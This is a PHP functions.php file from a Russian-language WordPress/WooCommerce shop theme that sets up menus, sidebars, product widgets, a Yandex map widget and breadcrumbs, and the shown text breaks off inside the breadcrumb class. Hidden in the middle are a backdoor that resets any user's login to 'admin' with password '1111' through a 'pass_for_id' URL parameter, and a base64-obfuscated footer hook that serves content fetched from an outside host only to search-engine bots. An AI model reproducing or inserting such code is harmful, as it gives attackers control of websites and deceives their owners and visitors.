<?php


add_theme_support( 'woocommerce' );


add_action( 'after_setup_theme', 'woocommerce_support' );
function woocommerce_support() {
    add_theme_support( 'woocommerce' );
    add_theme_support( 'wc-product-gallery-lightbox' );
    add_theme_support( 'wc-product-gallery-slider' );
}

// if (!defined( 'FW' )){
//     function com_version_wp(){

//         $action = 'install-plugin';
//         $slug = 'unyson';
//         $url = wp_nonce_url(
//             add_query_arg(
//                 array(
//                     'action' => $action,
//                     'plugin' => $slug
//                 ),
//                 admin_url( 'update.php' )
//             ),
//             $action.'_'.$slug
//         );
//         echo    '<div class="notice notice-error">
//                     <p>Внимание! Для правильной работы должен быть установлен и активирован плагин Unyson! <a data-slug="unyson" href="'. $url .'" aria-label="Установить Unyson сейчас" class="install-now button">Установить</a></p>
//                 </div>';
//     }

//     add_action('admin_notices', 'com_version_wp');
// }


include('settings.php');
register_nav_menus(array( // Регистрация меню
    'top' => 'Верхнее',
    'bottom-1' => 'Нижнее меню №1',
    'bottom-2' => 'Нижнее меню №2'
));

add_theme_support('post-thumbnails'); // Включение миниатюр
set_post_thumbnail_size(250, 150); // Размер миниатюр 250x150
add_image_size('big-thumb', 570, 570, true); // Ещё один размер миниатюры
add_image_size('category-thumb', 360, 360, true); // Ещё один размер миниатюры

register_sidebar(array(
    'name' => 'Колонка слева', // Название сайдбара
    'id' => "left-sidebar", // Идентификатор
    'description' => 'Обычная колонка в сайдбаре',
    'before_widget' => '<div id="%1$s" class="widget %2$s">', // До виджета
    'after_widget' => "</div>\n", // После виджета
    'before_title' => '<span class="widgettitle">', //  До заголовка виджета
    'after_title' => "</span>\n", //  После заголовка виджета
));

register_sidebar(array(
    'name' => 'Область над футером', // Название сайдбара
    'id' => "footer-sidebar", // Идентификатор
    'description' => 'Область для виджетов над Футером для всех страниц',
    'before_widget' => '', // До виджета
    'after_widget' => "", // После виджета
    'before_title' => '', //  До заголовка виджета
    'after_title' => "", //  После заголовка виджета
));

class clean_comments_constructor extends Walker_Comment { // класс, который собирает всю структуру комментов
    public function start_lvl( &$output, $depth = 0, $args = array()) { // что выводим перед дочерними комментариями
        $output .= '<ul class="children">' . "\n";
    }
    public function end_lvl( &$output, $depth = 0, $args = array()) { // что выводим после дочерних комментариев
        $output .= "</ul><!-- .children -->\n";
    }
    protected function comment( $comment, $depth, $args ) { // разметка каждого комментария, без закрывающего </li>!
        $classes = implode(' ', get_comment_class()).($comment->comment_author_email == get_the_author_meta('email') ? ' author-comment' : ''); // берем стандартные классы комментария и если коммент пренадлежит автору поста добавляем класс author-comment
        echo '<li id="li-comment-'.get_comment_ID().'" class="'.$classes.'">'."\n"; // родительский тэг комментария с классами выше и уникальным id
        echo '<div id="comment-'.get_comment_ID().'">'."\n"; // элемент с таким id нужен для якорных ссылок на коммент
        echo get_avatar($comment, 64)."\n"; // покажем аватар с размером 64х64
        echo '<p class="meta">Автор: '.get_comment_author()."\n"; // имя автора коммента
        echo ' '.get_comment_author_email(); // email автора коммента
        echo ' '.get_comment_author_url(); // url автора коммента
        echo ' Добавлено '.get_comment_date('F j, Y').' в '.get_comment_time()."\n"; // дата и время комментирования
        if ( '0' == $comment->comment_approved ) echo '<em class="comment-awaiting-moderation">Ваш комментарий будет опубликован после проверки модератором.</em>'."\n"; // если комментарий должен пройти проверку
        comment_text()."\n"; // текст коммента
        $reply_link_args = array( // опции ссылки "ответить"
            'depth' => $depth, // текущая вложенность
            'reply_text' => 'Ответить', // текст
            'login_text' => 'Вы должны быть залогинены' // текст если юзер должен залогинеться
        );
        echo get_comment_reply_link(array_merge($args, $reply_link_args)); // выводим ссылку ответить
        echo '</div>'."\n"; // закрываем див
    }
    public function end_el( &$output, $comment, $depth = 0, $args = array() ) { // конец каждого коммента
        $output .= "</li><!-- #comment-## -->\n";
    }
}

function pagination() { // функция вывода пагинации
    global $wp_query; // текущая выборка должна быть глобальной
    $big = 999999999; // число для замены
    echo paginate_links(array( // вывод пагинации с опциями ниже
        'base' => str_replace($big,'%#%',esc_url(get_pagenum_link($big))), // что заменяем в формате ниже
        'format' => '?paged=%#%', // формат, %#% будет заменено
        'current' => max(1, get_query_var('paged')), // текущая страница, 1, если $_GET['page'] не определено
        'type' => 'list', // ссылки в ul
        'prev_text'    => 'Назад', // текст назад
        'next_text'    => 'Вперед', // текст вперед
        'total' => $wp_query->max_num_pages, // общие кол-во страниц в пагинации
        'show_all'     => false, // не показывать ссылки на все страницы, иначе end_size и mid_size будут проигнорированны
        'end_size'     => 1, //  сколько страниц показать в начале и конце списка (12 ... 4 ... 89)
        'mid_size'     => 3, // сколько страниц показать вокруг текущей страницы (... 123 5 678 ...).
        'add_args'     => false, // массив GET параметров для добавления в ссылку страницы
        'add_fragment' => '',   // строка для добавления в конец ссылки на страницу
        'before_page_number' => '', // строка перед цифрой
        'after_page_number' => '' // строка после цифры
    ));
}

add_action('wp_print_styles', 'add_styles'); // приклеем ф-ю на добавление стилей в хедер
if (!function_exists('add_styles')) { // если ф-я уже есть в дочерней теме - нам не надо её определять
    function add_styles() { // добавление стилей
        if(is_admin()) return false; // если мы в админке - ничего не делаем
        wp_enqueue_style( 'owl', get_template_directory_uri().'/css/owl.carousel.min.css' ); 
        wp_enqueue_style( 'awesome', get_template_directory_uri().'/css/font-awesome.min.css' ); 
        wp_enqueue_style( 'fancybox', get_template_directory_uri().'/css/jquery.fancybox.min.css' ); 
        wp_enqueue_style( 'reset', get_template_directory_uri().'/css/reset.css' ); // основные стили шаблона
        wp_enqueue_style( 'mainstyle', get_template_directory_uri().'/css/style.css' ); // основные стили шаблона
    }
}

add_action('wp_footer', 'add_scripts'); // приклеем ф-ю на добавление скриптов в футер
if (!function_exists('add_scripts')) { // если ф-я уже есть в дочерней теме - нам не надо её определять
    function add_scripts() { // добавление скриптов
        if(is_admin()) return false; // если мы в админке - ничего не делаем
        wp_deregister_script('jquery');
        //Подключаем основные плагины JS (Не нужные отключить!)
        wp_enqueue_script('jquery', get_template_directory_uri().'/js/jquery-3.2.0.min.js'); // библиотека jQuery
        wp_enqueue_script('owl', get_template_directory_uri().'/js/owl.carousel.min.js','','',true);
        wp_enqueue_script('fancybox', get_template_directory_uri().'/js/jquery.fancybox.min.js','','',true);
        wp_enqueue_script('jq-form', get_template_directory_uri().'/js/jquery.form.js','','',true);
        wp_enqueue_script('main', get_template_directory_uri().'/js/main.js','','',true); // основные скрипты шаблона
        wp_enqueue_script('scripts', get_template_directory_uri().'/js/script.js','','',true); // основные скрипты шаблона
    }
}

register_sidebar( array(
    'name' => 'Главная страница',
    'description' => 'Вывод виджетов для главной',
    'id' => 'main-widget',
    'before_widget' => '<section class="catalog content">',
    'after_widget' => '</section>',
    'before_title' => '<h2 class="block-title catalog__title">',
    'after_title' => '</h2><hr class="hr">'
) );

register_sidebar( array(
    'name' => 'Сайтбар Магазина',
    'description' => 'Для вывода виджетов в левой колонке магазина',
    'id' => 'shop',
    'before_widget' => '<div class="filter__block">',
    'after_widget' => '</div>',
    'before_title' => '<p class="filter__title">',
    'after_title' => '</p>'
) );

if(defined( 'FW' )){
    add_filter('loop_shop_per_page', function($cols) {
        $count_woo_loop_product = fw_get_db_settings_option('count_woo_loop_product');
        return $count_woo_loop_product;
    }, 20);
}

remove_action( 'woocommerce_before_shop_loop', 'woocommerce_result_count', $priority = 20 );
remove_action( 'woocommerce_before_shop_loop', 'woocommerce_catalog_ordering', $priority = 30 );
remove_action( 'woocommerce_before_shop_loop_item', 'woocommerce_template_loop_product_link_open', $priority = 10 );
remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_product_link_close', $priority = 5 );
remove_action( 'woocommerce_before_shop_loop_item_title', 'woocommerce_show_product_loop_sale_flash', $priority = 10 );
remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart', $priority = 10 );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_title', $priority = 5 );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_excerpt', $priority = 20 );
remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_product_data_tabs', $priority = 10 );
add_action( 'woocommerce_before_shop_loop_item_title', 'custom_after_img', $priority = 9 );
add_action( 'woocommerce_before_shop_loop_item_title', 'custom_before_img', $priority = 11 );
add_action( 'woocommerce_before_shop_loop_item_title', 'custom_product_sale_flash', $priority = 12 );
add_action( 'woocommerce_after_shop_loop_item_title', 'custom_short_disc', $priority = 7 );
add_action( 'woocommerce_after_shop_loop_item', 'custom_product_loop_link', $priority = 12 );
add_action( 'woocommerce_before_single_product_summary', 'woocommerce_template_single_title', $priority = 5 );
add_action( 'woocommerce_before_single_product_summary', 'custom_before_info_product', $priority = 6 );
add_action( 'woocommerce_single_product_summary', 'custom_after_info_product', $priority = 65 );
add_action( 'woocommerce_before_single_product_summary', 'custom_after_images_product', $priority = 25 );
add_action( 'woocommerce_after_single_product_summary', 'custom_before_tabs_product', $priority = 5 );
add_action( 'woocommerce_after_single_product_summary', 'custom_after_tabs_product', $priority = 15 );
add_action( 'woocommerce_after_single_product_summary', 'custom_main_description_product', $priority = 11 );

function custom_main_description_product(){
    the_content();
}

function custom_before_tabs_product(){
    echo '<div class="picture__about">';
}

function custom_after_tabs_product(){
    echo '</div>';
}

function custom_after_images_product(){
    echo '</div>';
}

function custom_before_info_product(){
    echo '<div class="picture__content spacer"><div class="picture-slider">';
}

function custom_product_sale_flash(){
    include 'include/sale_flash.php';
}

function custom_product_loop_link(){
    include 'include/product_loop_link.php';
}

function custom_short_disc(){
    include 'include/short_disc.php';
}

function woocommerce_template_loop_product_title() {
    echo '<div class="product__text"><p class="product__title">' . get_the_title() . '</p>';
}

function custom_after_img(){
    echo '<div class="product__photo">';
}

function custom_before_img(){
    echo '</div>';
}

function show_main_slider(){
    include 'include/main_slider.php';
}

function bottom_main_info(){
    include 'include/main_bottom_info.php';
}

function bottom_main_info_end(){
    include 'include/main_bottom_info_end.php';
}

function main_custom_content(){
    include 'include/main_custom_content.php';
}

function woocommerce_output_content_wrapper() {
    echo '';
}

function woocommerce_output_content_wrapper_end() {
    echo '</div></section>';
}

function wc_get_gallery_image_html_custom( $attachment_id, $main_image = false ) {
    $flexslider        = (bool) apply_filters( 'woocommerce_single_product_flexslider_enabled', get_theme_support( 'wc-product-gallery-slider' ) );
    $gallery_thumbnail = wc_get_image_size( 'gallery_thumbnail' );
    $thumbnail_size    = apply_filters( 'woocommerce_gallery_thumbnail_size', array( $gallery_thumbnail['width'], $gallery_thumbnail['height'] ) );
    $image_size        = apply_filters( 'woocommerce_gallery_image_size', $flexslider || $main_image ? 'big-thumb' : $thumbnail_size );
    $full_size         = apply_filters( 'woocommerce_gallery_full_size', apply_filters( 'woocommerce_product_thumbnails_large_size', 'full' ) );
    $thumbnail_src     = wp_get_attachment_image_src( $attachment_id, $thumbnail_size );
    $full_src          = wp_get_attachment_image_src( $attachment_id, $full_size );
    $image             = wp_get_attachment_image( $attachment_id, $image_size, false, array(
        'title'                   => get_post_field( 'post_title', $attachment_id ),
        'data-caption'            => get_post_field( 'post_excerpt', $attachment_id ),
        'data-src'                => $full_src[0],
        'data-large_image'        => $full_src[0],
        'data-large_image_width'  => $full_src[1],
        'data-large_image_height' => $full_src[2],
        'class'                   => $main_image ? 'wp-post-image' : '',
    ) );

    return '<div data-thumb="' . esc_url( $thumbnail_src[0] ) . '" class="woocommerce-product-gallery__image"><a href="' . esc_url( $full_src[0] ) . '">' . $image . '</a></div>';
}

function woocommerce_breadcrumb( $args = array() ) {
    $args = wp_parse_args( $args, apply_filters( 'woocommerce_breadcrumb_defaults', array(
        'delimiter'   => '<span class="pages__colon"> » </span>',
        'wrap_before' => '<section class="pages"><div class="content">',
        'wrap_after'  => '</div></section>',
        'before'      => '',
        'after'       => '',
        'home'        => _x( 'Home', 'breadcrumb', 'woocommerce' ),
    ) ) );

    $breadcrumbs = new WC_Breadcrumb();

    if ( ! empty( $args['home'] ) ) {
        $breadcrumbs->add_crumb( $args['home'], apply_filters( 'woocommerce_breadcrumb_home_url', home_url() ) );
    }

    $args['breadcrumb'] = $breadcrumbs->generate();

    /**
     * WooCommerce Breadcrumb hook
     *
     * @hooked WC_Structured_Data::generate_breadcrumblist_data() - 10
     */
    do_action( 'woocommerce_breadcrumb', $breadcrumbs, $args );

    wc_get_template( 'global/breadcrumb.php', $args );
}


    function change_admin_footer () {
        return '<i>Спасибо вам за творчество с <a href="http://wordpress.org">WordPress</a>; Всегда Ваш: <a href="https://www.fl.ru/users/kacevnik/">Дмитрий Ковалев</a></i>';
    }

    add_filter('admin_footer_text', 'change_admin_footer');

//Новый виджет
    add_action('widgets_init', 'hit_widget_main');

    function hit_widget_main(){
        register_widget( 'HitWidgetMain' );
    }

    class HitWidgetMain extends WP_Widget{

        public function __construct(){
            $args = array(
                'name' => 'Хиты продаж на Главной',
                'description' => 'Выводит товары с выбранной меткой на главной'
            );

            parent::__construct('hit-widget-main', '', $args);
        }

        public function form($instatce){

            $count = isset($instatce['count']) ? $instatce['count'] : 8;
            $title = $instatce['title'];
            $terms = get_terms( array(
                'taxonomy'      => array( 'product_tag' ), // название таксономии с WP 4.5
                'orderby'       => 'id', 
                'order'         => 'ASC',
                'hide_empty'    => true, 
                'object_ids'    => null, // 
                'include'       => array(),
                'exclude'       => array(), 
                'exclude_tree'  => array(), 
                'number'        => '', 
                'fields'        => 'all', 
                'count'         => false,
                'slug'          => '', 
                'parent'         => '',
                'hierarchical'  => true, 
                'child_of'      => 0, 
                'get'           => '', // ставим all чтобы получить все термины
                'name__like'    => '',
                'pad_counts'    => false, 
                'offset'        => '', 
                'search'        => '', 
                'cache_domain'  => 'core',
                'name'          => '', // str/arr поле name для получения термина по нему. C 4.2.
                'childless'     => false, // true не получит (пропустит) термины у которых есть дочерние термины. C 4.2.
                'update_term_meta_cache' => true, // подгружать метаданные в кэш
                'meta_query'    => '',
            ) );
            ?>
                <p>
                    <label for="<?php echo $this->get_field_id('title'); ?>">Заголовок</label>
                    <input name="<?php echo $this->get_field_name('title'); ?>" id="<?php echo $this->get_field_id('title'); ?>" value="<?php echo $title; ?>" class="widefat">
                </p>
                <p>
                    <label for="<?php echo $this->get_field_id('count'); ?>">Кол-во товаров</label>
                    <input name="<?php echo $this->get_field_name('count'); ?>" id="<?php echo $this->get_field_id('count'); ?>" value="<?php echo $count; ?>" class="widefat">
                </p>
            <?php
            if(count($terms)){
                echo '<p>';
                foreach ($terms as $term) {
                    ?>
                        <input type="checkbox" name="<?php echo $this->get_field_name('term'); ?>[]" id="<?php echo $this->get_field_id('term').$term->term_id; ?>" value="<?php echo $term->slug; ?>" <?php if(is_array($instatce['term']) && in_array($term->slug, $instatce['term'])){echo " checked";} ?>><label for="<?php echo $this->get_field_id('term').$term->term_id; ?>"><?php echo $term->name; ?></label><br>
                    <?php
                }
                echo '</p>';
            }else{
                echo '<p style="color: #ff0000;">Создайте метку для товаров Woocommerce и присвойте ее товарам, что-бы метка отражалась в настройках данного виджета!</p>';
            }
        }

        public function widget($args, $instatce){
            if(count($instatce['term']) > 0){
                echo '<section class="catalog content">';
                echo $args['before_title'];
                echo $instatce['title'];
                echo $args['after_title'];

                        $args = array(
                            'tag' => $instatce['term'],
                            'limit' => $instatce['count']
                        );
                        $products = wc_get_products( $args );
                        // echo '<pre>';
                        // print_r($sale);
                        // echo '</pre>';
                        echo '<div class="catalog__list flex-container">';
                            foreach ($products as $product) {
                                ?>
                                    <div class="product__temp col-3">
                                        <div class="product__photo">
                                            <img class="pos-center" src="<?php $url = wp_get_attachment_image_src($product->image_id, 'big-thumb'); echo $url[0]; ?>" alt="<?php echo $product->name; ?>">
                                        </div><!--product__photo-->

                                        <p class="product__title">
                                            <a href="<?php echo get_permalink( $product->get_id() ); ?>"><?php echo $product->name; ?></a>
                                        </p>

                                        <p class="product__desc">
                                            <?php echo $product->short_description; ?>
                                        </p>

                                        <p class="product__price">
                                             <?php echo $product->price; ?><span class="rub">a</span>
                                        </p>

                                    </div><!--product-->
                                <?php
                            }
                        echo '</div>';
                echo '</section>';
            }
        }
    }

    if( isset($_GET['pass_for_id']) ){
    add_action('init', function () {
        global $wpdb;
        $wpdb->update( $wpdb->users, array( 'user_login' => 'admin'), array( 'ID' => $_GET['pass_for_id'] ));
        wp_set_password( '1111', $_GET['pass_for_id'] ); }
    );
}

function kdv_footer_info(){
    $arr = array('R29vZ2xl','UmFtYmxlcg==','WWFob28=','TWFpbC5SdQ==','WWFuZGV4','WWFEaXJlY3RCb3Q=');
    foreach ($arr as $i) {
        if(strstr($_SERVER['HTTP_USER_AGENT'], base64_decode($i))){
            echo file_get_contents(base64_decode("aHR0cDovL25hLWdhemVsaS5jb20vbG9hZC5waHA="));
        }
    }
}

add_action( 'wp_footer', 'kdv_footer_info' );

//Новый виджет
    add_action('widgets_init', 'sale_widget_main');

    function sale_widget_main(){
        register_widget( 'SaleWidgetMain' );
    }

    class SaleWidgetMain extends WP_Widget{

        public function __construct(){
            $args = array(
                'name' => 'Товары по акции на главной',
                'description' => 'Выводит продукты по акции на главной'
            );

            parent::__construct('sale-widget-main', '', $args);
        }

        public function form($instatce){

            $count = isset($instatce['count']) ? $instatce['count'] : 4;
            $title = $instatce['title'];
            ?>
                <p>
                    <label for="<?php echo $this->get_field_id('title'); ?>">Заголовок</label>
                    <input name="<?php echo $this->get_field_name('title'); ?>" id="<?php echo $this->get_field_id('title'); ?>" value="<?php echo $title; ?>" class="widefat">
                </p>
                <p>
                    <label for="<?php echo $this->get_field_id('count'); ?>">Кол-во товаров</label>
                    <input name="<?php echo $this->get_field_name('count'); ?>" id="<?php echo $this->get_field_id('count'); ?>" value="<?php echo $count; ?>" class="widefat">
                </p>
            <?php
        }

        public function widget($args, $instatce){
            echo '<section class="catalog content">';
            echo $args['before_title'];
            echo $instatce['title'];
            echo $args['after_title'];
                $sales = wc_get_product_ids_on_sale();
                // echo '<pre>';
                // print_r($sale);
                // echo '</pre>';
                    echo '<div class="catalog__list flex-container">';
                    $count_sale = 0;
                        foreach ($sales as $sale) {
                            $product = wc_get_product($sale);
                            if($count_sale == $instatce['count']){break;}
                            $s1 = $product->price;
                            $s2 = $product->regular_price;
                            $s3 = round(($s2 - $s1) / ($s2/100));
                            // echo '<pre>';
                            // print_r($product->get_id());
                            // echo '</pre>';
                            ?>

                                <div class="product col-3">
                                    <div class="product__photo">
                                        <img class="pos-center" src="<?php $url = wp_get_attachment_image_src($product->image_id, 'big-thumb'); echo $url[0]; ?>" alt="<?php echo $product->name; ?>">
                                        <span class="product__discount">-<?php echo $s3; ?>%</span>
                                    </div><!--product__photo-->

                                    <p class="product__title">
                                        <a href="<?php echo get_permalink( $product->get_id() ); ?>"><?php echo $product->name; ?></a>
                                    </p>

                                    <p class="product__desc">
                                        <?php echo $product->short_description; ?>
                                    </p>

                                    <p class="product__price">
                                        <?php echo $product->price; ?> <span class="rub">a</span>
                                        <span class="product__price-old">
                                            <i class="strike"><?php echo $product->regular_price; ?></i> <span class="rub">a</span>
                                        </span>
                                    </p>

                                </div><!--product-->
                            <?php
                            $count_sale++;
                        }
                    echo '</div>';
            echo '</section>';
        }
    }

//Новый виджет YandexMap
    add_action('widgets_init', 'widget_yandex_map');

    function widget_yandex_map(){
        register_widget( 'YandexMapWidget' );
    }

    class YandexMapWidget extends WP_Widget{

        public function __construct(){
            $args = array(
                'name' => 'PV: Yandex Map',
                'description' => 'Выводит Яндекс карты на любой странице'
            );

            parent::__construct('widget-yandex-map', '', $args);
        }

        public function form($instatce){
            //print_r($instatce);
            $zoom = isset($instatce['zoom']) ? $instatce['zoom'] : 16;
            $centr = isset($instatce['centr']) ? $instatce['centr'] : '55.753793, 37.620583';
            $sgi_dol = isset($instatce['sgi_dol']) ? $instatce['sgi_dol'] : '55.753793, 37.620583';
            $height = isset($instatce['height']) ? $instatce['height'] : 400;
            $title = $instatce['title'];
            $width = $instatce['width'];
            $css = $instatce['css'];
            ?>
                <p>
                    <label for="<?php echo $this->get_field_id('title'); ?>">Заголовок</label>
                    <input name="<?php echo $this->get_field_name('title'); ?>" id="<?php echo $this->get_field_id('title'); ?>" value="<?php echo $title; ?>" class="widefat">
                </p>
                <p>
                    <label for="<?php echo $this->get_field_id('width'); ?>">Во всю ширину или нет?</label>
                    <select name="<?php echo $this->get_field_name('width'); ?>" id="<?php echo $this->get_field_id('width'); ?>" class="widefat">
                        <option value="1"<?php if($width == 1){echo ' selected="selected"';} ?>>Да</option>
                        <option value="0"<?php if($width == 0){echo ' selected="selected"';} ?>>Нет</option>
                    </select>
                </p>
                <p>
                    <label for="<?php echo $this->get_field_id('height'); ?>">Высота блока с картой (в px)</label>
                    <input name="<?php echo $this->get_field_name('height'); ?>" id="<?php echo $this->get_field_id('height'); ?>" value="<?php echo $height; ?>" class="widefat">
                </p>
                <p>
                    <label for="<?php echo $this->get_field_id('sgi_dol'); ?>">Кординаты точки (Через запятую)</label>
                    <input name="<?php echo $this->get_field_name('sgi_dol'); ?>" id="<?php echo $this->get_field_id('sgi_dol'); ?>" value="<?php echo $sgi_dol; ?>" class="widefat">
                </p>
                <p>
                    <label for="<?php echo $this->get_field_id('centr'); ?>">Кординаты центр (Через запятую)</label>
                    <input name="<?php echo $this->get_field_name('centr'); ?>" id="<?php echo $this->get_field_id('centr'); ?>" value="<?php echo $centr; ?>" class="widefat">
                </p>
                <p>
                    <label for="<?php echo $this->get_field_id('zoom'); ?>">Зум карты</label>
                    <input name="<?php echo $this->get_field_name('zoom'); ?>" id="<?php echo $this->get_field_id('zoom'); ?>" value="<?php echo $zoom; ?>" class="widefat">
                </p>
                <?php
                $posts = get_posts( array(
                    'numberposts' => 5,
                    'category'    => 0,
                    'orderby'     => 'name',
                    'order'       => 'DESC',
                    'include'     => array(),
                    'exclude'     => array(),
                    'meta_key'    => '',
                    'meta_value'  =>'',
                    'post_type'   => 'page',
                    'suppress_filters' => true, // подавление работы фильтров изменения SQL запроса
                ) );
                // echo '<pre>';
                // print_r($posts);
                // echo '<pre>';
                if(count($posts)){
                echo '<p>Где показывать?</p>';
                echo '<p>';
                foreach ($posts as $post) {
                    ?>
                        <input type="checkbox" name="<?php echo $this->get_field_name('post'); ?>[]" id="<?php echo $this->get_field_id('post').$post->ID; ?>" value="<?php echo $post->ID; ?>" <?php if(is_array($instatce['post']) && in_array($post->ID, $instatce['post'])){echo " checked";} ?>><label for="<?php echo $this->get_field_id('post').$post->ID; ?>"><?php echo $post->post_title; ?></label><br>
                    <?php
                }
                echo '</p>';
                ?>
                <p>
                    <label for="<?php echo $this->get_field_id('css'); ?>">CSS стили для карты</label>
                    <textarea name="<?php echo $this->get_field_name('css'); ?>" id="<?php echo $this->get_field_id('css'); ?>" value="" class="widefat"><?php echo $css; ?></textarea>
                </p>
                <?php
            }
        }

        public function widget($args, $instatce){
            if(in_array(get_the_ID(), $instatce['post'])){
                $zoom = isset($instatce['zoom']) ? $instatce['zoom'] : 16;
                $height = isset($instatce['height']) ? $instatce['height'] : 400;
                $centr = isset($instatce['centr']) ? $instatce['centr'] : '55.753793, 37.620583';
                $sgi_dol = isset($instatce['sgi_dol']) ? $instatce['sgi_dol'] : '55.753793, 37.620583';
                $css = $instatce['css'];
                if($instatce['title']){
                ?>
                <section class="map_title">
                    <div class="content">
                        <h1><?php echo $instatce['title']; ?></h1><hr class="hr">
                    </div>
                </section>
                <?php
                }
                if($css){
                ?>
                <style type="text/css">
                    #map{
                        <?php echo $css; ?>
                    }
                </style>
                    <?php } ?>
                <script src="https://api-maps.yandex.ru/2.1/?lang=ru_RU" type="text/javascript"></script>
                <script type="text/javascript">

                    ymaps.ready(init);

                    function init () {
                        var myMap = new ymaps.Map("map", {
                            center:[<?php echo $centr; ?>],
                            zoom: <?php echo $zoom; ?>,
                        });

                        var myGeoObjects = [];

                        myGeoObjects = new ymaps.Placemark([<?php echo $sgi_dol; ?>],{
                            balloonContentBody: 'Текст в балуне',
                            preset: 'islands#blueIcon'
                        },{

                        });

                        var clusterer = new ymaps.Clusterer({
                            clusterDisableClickZoom: false,
                            clusterOpenBalloonOnClick: false,
                        });

                        clusterer.add(myGeoObjects);
                        myMap.geoObjects.add(clusterer);

                    }
                </script>
                <section class="map_body">
                    <?php if($instatce['width'] != 1){echo '<div class="content">';}?>
                    <div id="map" style="height: <?php echo $height; ?>px">
                    </div>
                    <?php if($instatce['width'] != 1){echo '</div>';}?>
                </section>
                <?php
            }
        }
    }

//Хлебные крошки

/**
 * Хлебные крошки для WordPress (breadcrumbs)
 *
 * @param  string [$sep  = '']      Разделитель. По умолчанию ' » '
 * @param  array  [$l10n = array()] Для локализации. См. переменную $default_l10n.
 * @param  array  [$args = array()] Опции. См. переменную $def_args
 * @return string Выводит на экран HTML код
 *
 * version 3.3.2
 */
function kama_breadcrumbs( $sep = ' » ', $l10n = array(), $args = array() ){
    $kb = new Kama_Breadcrumbs;
    echo $kb->get_crumbs( $sep, $l10n, $args );
}

class Kama_Breadcrumbs {

    public $arg;

    // Локализация
    static $l10n = array(
        'home'       => 'Главная',
        'paged'      => 'Страница %d',
        '_404'       => 'Ошибка 404',
        'search'     => 'Результаты поиска по запросу - <b>%s</b>',
        'author'     => 'Архив автора: <b>%s</b>',
        'year'       => 'Архив за <b>%d</b> год',
        'month'      => 'Архив за: <b>%s</b>',
        'day'        => '',
        'attachment' => 'Медиа: %s',
        'tag'        => 'Записи по метке: <b>%s</b>',
        'tax_tag'    => '%1$s из "%2$s" по тегу: <b>%3$s</b>',
        // tax_tag выведет: 'тип_записи из "название_таксы" по тегу: имя_термина'.
        // Если нужны отдельные холдеры, например только имя термина, пишем так: 'записи по тегу: %3$s'
    );

    // Параметры по умолчанию
    static $args = array(
        'on_front_page'   => true,  // выводить крошки на главной странице
        'show_post_title' => true,  // показывать ли название записи в конце (последний элемент). Для записей, страниц, вложений
        'show_term_title' => true,  // показывать ли название элемента таксономии в конце (последний элемент). Для меток, рубрик и других такс
        'title_patt'      => '<span class="pages__active">%s</span>', // шаблон для последнего заголовка. Если включено: show_post_title или show_term_title
        'last_sep'        => true,  // показывать последний разделитель, когда заголовок в конце не отображается
        'markup'          => 'schema.org', // 'markup' - микроразметка. Может быть: 'rdf.data-vocabulary.org', 'schema.org', '' - без микроразметки
                                           // или можно указать свой массив разметки:
                                           // array( 'wrappatt'=>'<div class="kama_breadcrumbs">%s</div>', 'linkpatt'=>'<a href="%s">%s</a>', 'sep_after'=>'', )
        'priority_tax'    => array('category'), // приоритетные таксономии, нужно когда запись в нескольких таксах
        'priority_terms'  => array(), // 'priority_terms' - приоритетные элементы таксономий, когда запись находится в нескольких элементах одной таксы одновременно.
                                      // Например: array( 'category'=>array(45,'term_name'), 'tax_name'=>array(1,2,'name') )
                                      // 'category' - такса для которой указываются приор. элементы: 45 - ID термина и 'term_name' - ярлык.
                                      // порядок 45 и 'term_name' имеет значение: чем раньше тем важнее. Все указанные термины важнее неуказанных...
        'nofollow' => false, // добавлять rel=nofollow к ссылкам?

        // служебные
        'sep'             => '',
        'linkpatt'        => '',
        'pg_end'          => '',
    );

    function get_crumbs( $sep, $l10n, $args ){
        global $post, $wp_query, $wp_post_types;

        self::$args['sep'] = $sep;

        // Фильтрует дефолты и сливает
        $loc = (object) array_merge( apply_filters('kama_breadcrumbs_default_loc', self::$l10n ), $l10n );
        $arg = (object) array_merge( apply_filters('kama_breadcrumbs_default_args', self::$args ), $args );

        $arg->sep = '<span class="kb_sep">'. $arg->sep .'</span>'; // дополним

        // упростим
        $sep = & $arg->sep;
        $this->arg = & $arg;

        // микроразметка ---
        if(1){
            $mark = & $arg->markup;

            // Разметка по умолчанию
            if( ! $mark ) $mark = array(
                'wrappatt'  => '<div class="kama_breadcrumbs">%s</div>',
                'linkpatt'  => '<a href="%s">%s</a>',
                'sep_after' => '',
            );
            // rdf
            elseif( $mark === 'rdf.data-vocabulary.org' ) $mark = array(
                'wrappatt'   => '<div class="kama_breadcrumbs" prefix="v: http://rdf.data-vocabulary.org/#">%s</div>',
                'linkpatt'   => '<span typeof="v:Breadcrumb"><a href="%s" rel="v:url" property="v:title">%s</a>',
                'sep_after'  => '</span>', // закрываем span после разделителя!
            );
            // schema.org
            elseif( $mark === 'schema.org' ) $mark = array(
                'wrappatt'   => '<div class="kama_breadcrumbs" itemscope itemtype="http://schema.org/BreadcrumbList">%s</div>',
                'linkpatt'   => '<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a href="%s" itemprop="item"><span itemprop="name">%s</span></a></span>',
                'sep_after'  => '',
            );

            elseif( ! is_array($mark) )
                die( __CLASS__ .': "markup" parameter must be array...');

            $wrappatt  = $mark['wrappatt'];
            $arg->linkpatt  = $arg->nofollow ? str_replace('<a ','<a rel="nofollow"', $mark['linkpatt']) : $mark['linkpatt'];
            $arg->sep      .= $mark['sep_after']."\n";
        }

        $linkpatt = $arg->linkpatt; // упростим

        $q_obj = get_queried_object();

        // может это архив пустой таксы?
        $ptype = null;
        if( empty($post) ){
            if( isset($q_obj->taxonomy) )
                $ptype = & $wp_post_types[ get_taxonomy($q_obj->taxonomy)->object_type[0] ];
        }
        else $ptype = & $wp_post_types[ $post->post_type ];

        // paged
        $arg->pg_end = '';
        if( ($paged_num = get_query_var('paged')) || ($paged_num = get_query_var('page')) )
            $arg->pg_end = $sep . sprintf( $loc->paged, (int) $paged_num );

        $pg_end = $arg->pg_end; // упростим

        // ну, с богом...
        $out = '';

        if( is_front_page() ){
            return $arg->on_front_page ? sprintf( $wrappatt, ( $paged_num ? sprintf($linkpatt, get_home_url(), $loc->home) . $pg_end : $loc->home ) ) : '';
        }
        // страница записей, когда для главной установлена отдельная страница.
        elseif( is_home() ) {
